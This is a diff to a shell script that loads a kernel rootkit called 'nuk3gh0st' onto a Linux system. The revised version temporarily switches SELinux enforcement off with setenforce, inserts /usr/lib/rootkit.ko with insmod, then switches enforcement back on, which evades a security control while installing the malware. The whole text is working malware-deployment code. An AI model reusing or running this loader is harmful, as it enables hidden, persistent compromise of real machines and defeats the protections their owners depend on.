@@ -3,15 +3,17 @@ echo "#################################"
 echo "# Loading nuk3gh0st LKM rootkit #"
 echo "#################################"
 echo ""
-echo "Checking if SELINUX is enabled"
-if [ -f /usr/sbin/semanage ]; then
-        echo "SELINUX is enabled"
-        echo "semanage permissive -a insmod_t"
-	semanage permissive -a insmod_t
-        echo "insmod /usr/lib/rootkit.ko"
+echo "Checking if SELINUX is enabled..."
+if [ -f /usr/sbin/setenforce ]; then
+	echo "SELINUX is enabled"
+	echo "setenforce 0"
+	setenforce 0
+	echo "insmod /usr/lib/rootkit.ko"
         insmod /usr/lib/rootkit.ko
+	echo "setenforce 1"
+	setenforce 1
 else
-        echo "SELINUX is disabled"
-        echo "insmod /usr/lib/rootkit.ko"
+	echo "SELINUX is disabled"
+	echo "insmod /usr/lib/rootkit.ko"
         insmod /usr/lib/rootkit.ko
 fi
